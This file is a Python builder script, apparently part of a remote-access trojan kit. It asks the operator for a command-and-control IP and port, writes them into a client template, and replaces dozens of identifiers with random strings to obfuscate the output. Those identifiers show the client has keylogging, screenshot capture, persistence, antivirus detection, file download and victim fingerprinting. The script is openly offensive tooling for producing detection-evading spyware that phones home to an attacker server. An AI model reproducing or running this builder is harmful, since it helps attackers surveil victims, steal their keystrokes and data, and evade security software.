import random
import string
import os

print("""
                   <-.(`-') (`-')  _  (`-')         (`-')  _ (`-').->                        (`-')  <-. (`-')_ (`-')  _  (`-') (`-')  _(`-')                 (`-')  
 _            .->   __( OO) ( OO).-<-.(OO )_        (OO ).-/ ( OO)_      .->           .->   ( OO).-/  \( OO) )( OO).-<-.(OO ) (OO ).-/( OO).->      .->  <-.(OO )  
 \-,-----.,--.'  ,-'-'---.\(,------,------,\-,-----./ ,---. (_)--\_),--.(,--.       ,---(`-'(,------,--./ ,--/(,------,------,)/ ,---. /    '._ (`-')----.,------,) 
  |  .--.(`-')'.'  | .-. (/ |  .---|   /`. '|  .--./| \ /`.\/    _ /|  | |(`-')    '  .-(OO )|  .---|   \ |  | |  .---|   /`. '| \ /`.\|'--...__( OO).-.  |   /`. ' 
 /_) (`-'(OO \    /| '-' `.(|  '--.|  |_.' /_) (`-')'-'|_.' \_..`--.|  | |(OO )    |  | .-, (|  '--.|  . '|  |(|  '--.|  |_.' |'-'|_.' `--.  .--( _) | |  |  |_.' | 
 ||  |OO )|  /   /)| /`'.  ||  .--'|  .   .||  |OO (|  .-.  .-._)   |  | | |  \    |  | '.(_/|  .--'|  |\    | |  .--'|  .   .(|  .-.  |  |  |   \|  |)|  |  .   .' 
(_'  '--'\`-/   /` | '--'  /|  `---|  |\  (_'  '--'\|  | |  \       \  '-'(_ .'    |  '-'  | |  `---|  | \   | |  `---|  |\  \ |  | |  |  |  |    '  '-'  |  |\  \  
   `-----'  `--'   `------' `------`--' '--' `-----'`--' `--'`-----' `-----'        `-----'  `------`--'  `--' `------`--' '--'`--' `--'  `--'     `-----'`--' '--'
""")

while True:
	if os.path.exists('ressources/client_template.py'):
		C2_IP = input("C2 IP : ")
		C2_PORT = input("C2 PORT : ")

		with open('ressources/client_template.py', 'r') as client_template:
		    data = client_template.read()

		    data = data.replace('METTRE_IP_DU_C2_ICI', C2_IP)
		    data = data.replace('METTRE_PORT_DU_C2_ICI', C2_PORT)

		    for i in range(1,13):
		    	random_string = ''.join(random.choices(string.hexdigits, k=1024))
		    	data = data.replace('COMMTEMPLATE' + str(i), random_string)

		    data = data.replace('mysock', ''.join(random.choices(string.ascii_uppercase, k=32)))
		    data = data.replace('myhost', ''.join(random.choices(string.ascii_uppercase, k=32)))
		    data = data.replace('myport', ''.join(random.choices(string.ascii_uppercase, k=32)))
		    data = data.replace('tmpdir', ''.join(random.choices(string.ascii_uppercase, k=32)))
		    data = data.replace('tmplogs', ''.join(random.choices(string.ascii_uppercase, k=32)))
		    data = data.replace('command', ''.join(random.choices(string.ascii_uppercase, k=32)))
		    data = data.replace('get_response', ''.join(random.choices(string.ascii_uppercase, k=32)))
		    data = data.replace('nom_fichier', ''.join(random.choices(string.ascii_uppercase, k=32)))
		    data = data.replace('fichier_output', ''.join(random.choices(string.ascii_uppercase, k=32)))
		    data = data.replace('myscreenshot', ''.join(random.choices(string.ascii_uppercase, k=32)))
		    data = data.replace('logger', ''.join(random.choices(string.ascii_uppercase, k=32)))
		    data = data.replace('lien', ''.join(random.choices(string.ascii_uppercase, k=32)))
		    data = data.replace('fct_screenshot', ''.join(random.choices(string.ascii_uppercase, k=32)))
		    data = data.replace('process_key_press', ''.join(random.choices(string.ascii_uppercase, k=32)))
		    data = data.replace('fct_persistence', ''.join(random.choices(string.ascii_uppercase, k=32)))
		    data = data.replace('localisation', ''.join(random.choices(string.ascii_uppercase, k=32)))
		    data = data.replace('picname', ''.join(random.choices(string.ascii_uppercase, k=32)))
		    data = data.replace('result', ''.join(random.choices(string.ascii_uppercase, k=32)))
		    data = data.replace('keyboard_listener', ''.join(random.choices(string.ascii_uppercase, k=32)))
		    data = data.replace('fct_download', ''.join(random.choices(string.ascii_uppercase, k=32)))
		    data = data.replace('len_img', ''.join(random.choices(string.ascii_uppercase, k=32)))
		    data = data.replace('img', ''.join(random.choices(string.ascii_uppercase, k=32)))
		    data = data.replace('len_logs', ''.join(random.choices(string.ascii_uppercase, k=32)))
		    data = data.replace('tmp_logs', ''.join(random.choices(string.ascii_uppercase, k=32)))
		    data = data.replace('tmp_pic', ''.join(random.choices(string.ascii_uppercase, k=32)))
		    data = data.replace('username', ''.join(random.choices(string.ascii_uppercase, k=32)))
		    data = data.replace('hostname', ''.join(random.choices(string.ascii_uppercase, k=32)))
		    data = data.replace('req_for_IP', ''.join(random.choices(string.ascii_uppercase, k=32)))
		    data = data.replace('IP_addr', ''.join(random.choices(string.ascii_uppercase, k=32)))
		    data = data.replace('version_pc', ''.join(random.choices(string.ascii_uppercase, k=32)))
		    data = data.replace('identification_string', ''.join(random.choices(string.ascii_uppercase, k=32)))
		    data = data.replace('detect_av', ''.join(random.choices(string.ascii_uppercase, k=32)))
		    data = data.replace('AV_List', ''.join(random.choices(string.ascii_uppercase, k=32)))
		    data = data.replace('key', ''.join(random.choices(string.ascii_uppercase, k=32)))
		    data = data.replace('key_bytes', ''.join(random.choices(string.ascii_uppercase, k=32)))
		    data = data.replace('encrypted_AV_List', ''.join(random.choices(string.ascii_uppercase, k=32)))
		    data = data.replace('AV_dec', ''.join(random.choices(string.ascii_uppercase, k=32)))
		    data = data.replace('antivirus', ''.join(random.choices(string.ascii_uppercase, k=32)))
		    data = data.replace('Proc_List', ''.join(random.choices(string.ascii_uppercase, k=32)))

		with open('client.py', 'w') as f:
		    f.write(data)

		break

	else:
		print("[-] The template ressources/client_template.py does not exist !\nPlease be sure to be in the good directory.")
		exit(1)
